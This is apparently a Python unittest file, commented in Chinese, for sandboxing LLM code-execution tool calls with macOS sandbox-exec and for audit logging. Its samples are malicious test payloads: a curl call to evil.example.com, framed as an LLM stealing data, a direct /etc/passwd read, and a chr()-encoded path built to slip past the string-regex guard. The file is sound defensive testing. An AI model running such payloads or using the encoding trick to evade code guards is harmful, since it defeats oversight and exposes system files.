"""
BL-S29.3 (5/7) 端到端验证: chat → tool-bridge dispatch → 沙箱跑 → audit log 落地.

验证 5 件事:
1. dispatch_tool 入口启用沙箱时, execute_code 真在 sandbox-exec 里跑
2. 合法代码 OK, 拿到正确输出
3. 恶意代码 (curl 外联 / 读 /etc/passwd) 被拦
4. audit log 真写到 ~/.hermes/.catfish_audit.jsonl, 含 sandbox_used / sandbox_kind 字段
5. audit log 不漏代码内容 (只 args_preview 截短, 不全量记录)

跑法:
    cd ~/person_task/catfish/edge/tool-bridge
    python3 -m unittest tests.test_e2e_sandbox -v

跑完后, 演示给信安看:
    cat ~/.hermes/.catfish_audit.jsonl | tail -5 | jq .
    cat ~/.hermes/.catfish_audit.jsonl | jq 'select(.sandbox_used == true)'
"""
from __future__ import annotations

import asyncio
import json
import os
import platform
import time
import unittest
from pathlib import Path
from unittest.mock import patch


SKIP_NON_MACOS = platform.system() != "Darwin"


@unittest.skipIf(SKIP_NON_MACOS, "sandbox-exec 仅 macOS")
class TestE2ESandboxDispatch(unittest.TestCase):
    """端到端: dispatch_tool → 沙箱 → 真返结果 + audit 真落地."""

    def setUp(self):
        # 装 mock registry, 防止 _do_dispatch 走 hermes 路径
        # (我们要验的就是它**不走 hermes**, 而是走沙箱)
        from catfish_tool_bridge import adapter

        class _StubRegistry:
            class registry:
                @staticmethod
                def get_all_tool_names():
                    return ["execute_code", "python", "bash", "shell_exec"]

                @staticmethod
                def get_toolset_for_tool(_):
                    return None

                @staticmethod
                def is_toolset_available(_):
                    return True

                @staticmethod
                def dispatch(name, args):
                    raise AssertionError(f"沙箱启用时不应走 hermes! name={name}")

                @staticmethod
                def get_max_result_size(_):
                    return 100_000

        adapter.install_registry(_StubRegistry())

        # audit 输出独立临时文件, 不污染员工 ~/.hermes/.catfish_audit.jsonl
        from catfish_tool_bridge import audit
        self._audit_path = Path(
            f"/tmp/catfish-e2e-audit-{os.getpid()}-{int(time.time())}.jsonl"
        )
        if self._audit_path.exists():
            self._audit_path.unlink()
        audit._set_audit_path(self._audit_path)

    def tearDown(self):
        # 清理测试 audit 文件
        if self._audit_path.exists():
            self._audit_path.unlink()

    def _read_audit(self) -> list[dict]:
        """读 audit jsonl 全部行, 返 list of dict."""
        if not self._audit_path.exists():
            return []
        events = []
        with self._audit_path.open() as f:
            for line in f:
                line = line.strip()
                if line:
                    events.append(json.loads(line))
        return events

    # ========== Test 1: 合法代码端到端 ==========

    def test_e2e_legit_python_dispatched_to_sandbox(self):
        from catfish_tool_bridge import adapter

        with patch.dict(os.environ, {"CATFISH_SANDBOX_EXEC": "1"}, clear=False):
            result = asyncio.run(adapter.dispatch_tool(
                "execute_code",
                {"code": "import json; print(json.dumps({'a': 1, 'b': 2}))"}
            ))

        # 结果验证
        self.assertTrue(result["ok"], f"合法代码失败: {result}")
        self.assertIn('"a": 1', result["result"]["stdout"])
        self.assertTrue(result["result"]["sandbox_used"])
        self.assertEqual(result["result"]["sandbox_kind"], "sandbox-exec")
        self.assertEqual(result["result"]["returncode"], 0)

        # audit 验证
        events = self._read_audit()
        self.assertEqual(len(events), 1, f"应写 1 条 audit, 实际: {events}")
        ev = events[0]
        self.assertEqual(ev["tool"], "execute_code")
        self.assertTrue(ev["ok"])
        self.assertTrue(ev["sandbox_used"])
        self.assertEqual(ev["sandbox_kind"], "sandbox-exec")

    # ========== Test 2: 恶意代码被沙箱拦 ==========

    def test_e2e_malicious_curl_blocked_audit_logged(self):
        """LLM 想 curl 偷数据 → 沙箱拦 + audit 留痕."""
        from catfish_tool_bridge import adapter

        with patch.dict(os.environ, {"CATFISH_SANDBOX_EXEC": "1"}, clear=False):
            result = asyncio.run(adapter.dispatch_tool(
                "execute_code",
                {
                    "code": (
                        "import subprocess, sys; "
                        "r = subprocess.run(['curl','-s','--connect-timeout','3','http://evil.example.com']); "
                        "sys.exit(r.returncode if r.returncode != 0 else 1)"
                    )
                }
            ))

        # 沙箱拦了 → ok=False (curl 返非 0)
        self.assertFalse(result["ok"], "沙箱漏了网络外联!")
        self.assertNotEqual(result["result"]["returncode"], 0)
        # 沙箱字段还在
        self.assertTrue(result["result"]["sandbox_used"])

        # audit 验证: 失败的也要记 (信安部门要查"谁在啥时候试图越权")
        events = self._read_audit()
        self.assertEqual(len(events), 1)
        ev = events[0]
        self.assertFalse(ev["ok"])
        self.assertTrue(ev["sandbox_used"])
        self.assertIsNotNone(ev["error"])

    def test_e2e_l1_string_guard_blocks_obvious_etc_passwd(self):
        """L1 (字符串规则) 拦明显恶意, 不需要进沙箱.

        这验证双层防御的第一层 — _check_execute_code_security 的 25 类正则
        遇到字面 /etc/passwd 直接拒, sandbox-exec 都不用启动. result=None,
        error 含守卫信息. audit 写"security_block: exec_guard".
        """
        from catfish_tool_bridge import adapter

        with patch.dict(os.environ, {"CATFISH_SANDBOX_EXEC": "1"}, clear=False):
            result = asyncio.run(adapter.dispatch_tool(
                "execute_code",
                {"code": "open('/etc/passwd','rb').read()"}
            ))

        self.assertFalse(result["ok"], "L1 字符串规则没拦 /etc/passwd!")
        self.assertIsNone(result["result"], "L1 拦了, 不应进 sandbox dispatch")
        self.assertIsNotNone(result["error"])
        # 测试: error 信息提示这是 L1 字符串规则拦的
        self.assertTrue(
            "守卫" in result["error"] or "guard" in result["error"].lower()
            or "execute_code" in result["error"].lower()
        )

    def test_e2e_l2_sandbox_blocks_etc_passwd_via_chr_bypass(self):
        """L2 (沙箱) 兜底: LLM 用 chr() 绕过 L1 字符串规则, 沙箱仍能拦.

        这是真正的"沙箱兜底"测试 — payload 中没有字面 '/etc/passwd',
        L1 25 类正则看不到威胁字符串, 放行进沙箱; 沙箱内 SBPL 拦 file-read*.
        """
        from catfish_tool_bridge import adapter

        # chr(47)='/', chr(101)='e', chr(116)='t', chr(99)='c', chr(112)='p'
        # ... 拼出 /etc/passwd 但 L1 字符串规则看不到完整字符串
        bypass_code = (
            "p = chr(47)+chr(101)+chr(116)+chr(99)+chr(47)"
            "+chr(112)+chr(97)+chr(115)+chr(115)+chr(119)+chr(100); "
            "open(p, 'rb').read()"
        )

        with patch.dict(os.environ, {"CATFISH_SANDBOX_EXEC": "1"}, clear=False):
            result = asyncio.run(adapter.dispatch_tool(
                "execute_code",
                {"code": bypass_code}
            ))

        # 沙箱拦了 → ok=False, 但 result 不是 None (沙箱真跑过, 返了 stderr)
        self.assertFalse(result["ok"], "沙箱漏了 chr() 绕过的 /etc/passwd 读!")
        self.assertIsNotNone(result["result"], "应该走到沙箱并返回 result dict")
        self.assertTrue(result["result"]["sandbox_used"])
        # 沙箱拒后 python 抛 PermissionError
        combined = result["result"]["stderr"] + result["result"]["stdout"]
        self.assertIn("Permission", combined,
                      f"沙箱该返 PermissionError, 实际: {combined}")

        # audit 验证: 沙箱用了, 失败留痕
        events = self._read_audit()
        self.assertEqual(len(events), 1)
        self.assertFalse(events[0]["ok"])
        self.assertTrue(events[0]["sandbox_used"])
        self.assertEqual(events[0]["sandbox_kind"], "sandbox-exec")

    # ========== Test 3: audit 不漏 LLM 代码全文 (隐私) ==========

    def test_e2e_audit_does_not_leak_full_code(self):
        """audit 只记 args_preview (200 字截短), 不记 LLM 代码全文.
        如果 LLM 代码包含敏感信息 (虽然不该), audit 不该全量曝光.
        """
        from catfish_tool_bridge import adapter

        big_code = "x = 'A' * 10000\nprint(len(x))"  # 10K 字符
        with patch.dict(os.environ, {"CATFISH_SANDBOX_EXEC": "1"}, clear=False):
            result = asyncio.run(adapter.dispatch_tool(
                "execute_code",
                {"code": big_code}
            ))

        self.assertTrue(result["ok"])
        events = self._read_audit()
        self.assertEqual(len(events), 1)
        # args_preview 应该截短, 不会全量 10K
        preview = events[0]["args_preview"]
        self.assertLess(len(preview), 1000,
                        f"audit args_preview 没截短! 长度 {len(preview)}")

    # ========== Test 4: 沙箱关闭时不影响行为 (向后兼容) ==========

    def test_e2e_sandbox_disabled_falls_back_to_hermes(self):
        """env CATFISH_SANDBOX_EXEC=0 → 不走沙箱, 走原 hermes 路径
        (我们 stub registry.dispatch raise AssertionError, 错误进 audit error 字段
        说明走了 hermes 路径).
        """
        from catfish_tool_bridge import adapter

        env_no_sandbox = {k: v for k, v in os.environ.items()
                          if k != "CATFISH_SANDBOX_EXEC"}
        with patch.dict(os.environ, env_no_sandbox, clear=True):
            result = asyncio.run(adapter.dispatch_tool(
                "execute_code",
                {"code": "print('hello')"}
            ))

        self.assertFalse(result["ok"])
        self.assertIn("AssertionError", result.get("error", ""))
        # audit 字段不该有 sandbox_used (因为没走沙箱)
        events = self._read_audit()
        self.assertEqual(len(events), 1)
        self.assertNotIn("sandbox_used", events[0])


if __name__ == "__main__":
    unittest.main(verbosity=2)
